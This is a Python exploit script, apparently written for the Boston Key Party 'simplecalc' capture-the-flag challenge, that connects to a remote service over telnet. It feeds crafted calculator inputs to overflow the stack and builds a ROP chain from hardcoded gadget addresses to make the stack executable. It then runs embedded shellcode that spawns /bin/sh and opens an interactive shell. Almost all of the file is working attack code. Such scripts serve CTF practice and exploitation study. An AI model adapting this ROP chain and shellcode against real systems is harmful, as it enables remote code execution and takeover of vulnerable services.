import telnetlib
import struct

pack64 = lambda x : struct.pack( "<Q", x )
unpack64 = lambda x : struct.unpack( "<Q", x )[0]

pack = lambda x : struct.pack( "<L", x )
unpack = lambda x : struct.unpack( "<L", x )[0]

#HOST = "127.0.0.1"
#PORT = 8889

HOST = 'simplecalc.bostonkey.party'
PORT = 5500

tn = telnetlib.Telnet(HOST, PORT)

make_stack_exec_addr = pack64(0x00000000004717E0)
stack_prot = pack64(0x00000000006C0FE0)
stack_end = pack64(0x00000000006C0F88)
main_addr = pack64(0x0000000000401383)

prax = pack64(0x000000000044db34) # pop rax ; ret
prcx = pack64(0x00000000004b8f17) # pop rcx ; ret
prdx = pack64(0x0000000000437a85) # pop rdx ; ret
meaxedx = pack64(0x0000000000451058) # mov eax, edx ; pop rbx ; ret
mdrdxecx = pack64(0x0000000000476636) # mov dword ptr [rdx], ecx ; ret 
praxret = pack64(0x000000000044db34) # pop rax ; ret
prdiret = pack64(0x0000000000401b73) # pop rdi ; ret

jrsp = pack64(0x00000000004B48BB) # jmp rsp

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90" * 5

div_result = pack64(0x00000000006C4A98)

def sub_address(x):
	tn.write('2\n')

	lo = x[:4]
	hi = x[4:8]

	print tn.read_until(':')

	lo = unpack(lo) + 40

	tn.write(str(lo) + '\n')

	print tn.read_until(':')

	tn.write(str(40) + '\n')
	print tn.read_until(':')
	print tn.read_until('=>')

	tn.write('2\n')

	print tn.read_until(':')
	
	print hi.encode('hex')
	hi = unpack(hi) + 40

	tn.write(str(hi) + '\n')
	print tn.read_until(':')

	tn.write(str(40) + '\n')
	print tn.read_until(':')
	print tn.read_until('=>')
	

def add(x, y):
	tn.write('1\n')

	print tn.read_until(':')
	
	tn.write(str(x) + '\n')
	print tn.read_until(':')

	tn.write(str(y) + '\n')
	print tn.read_until(':')
	print tn.read_until('=>')


def sub(x, y):
	tn.write('2\n')

	print tn.read_until(':')
	
	tn.write(str(x) + '\n')
	print tn.read_until(':')

	tn.write(str(y) + '\n')
	print tn.read_until(':')
	print tn.read_until('=>')

def mul(x, y):
	tn.write('3\n')

	print tn.read_until(':')
	
	tn.write(str(x) + '\n')
	print tn.read_until(':')

	tn.write(str(y) + '\n')
	print tn.read_until(':')
	print tn.read_until('=>')

def div(x, y):
	tn.write('4\n')

	print tn.read_until(':')
	
	tn.write(str(x) + '\n')
	print tn.read_until(':')

	tn.write(str(y) + '\n')
	print tn.read_until(':')
	print tn.read_until('=>')

print tn.read_until(':')

num_calc = '100\n'

tn.write(num_calc)

print tn.read_until('=>')

for i in range(0, 11):
	sub(40, 40)

add(0xffffffff, 0xffffffff)

sub_address(pack64(unpack64(div_result) + 8))
sub_address(prcx)
sub_address(prcx)

sub_address(prcx)
sub_address(pack64(7))

sub_address(prdx)
sub_address(stack_prot)

sub_address(mdrdxecx)

sub_address(prdiret)
sub_address(stack_end)
sub_address(make_stack_exec_addr)

sub_address(jrsp)

sub_address(shellcode[:8])
sub_address(shellcode[8:16])
sub_address(shellcode[16:24])
sub_address(shellcode[24:32])

sub(0x21 + 0x40, 0x40)
div(0x21 * 0x40, 0x40)

tn.write('5\n')

tn.interact()

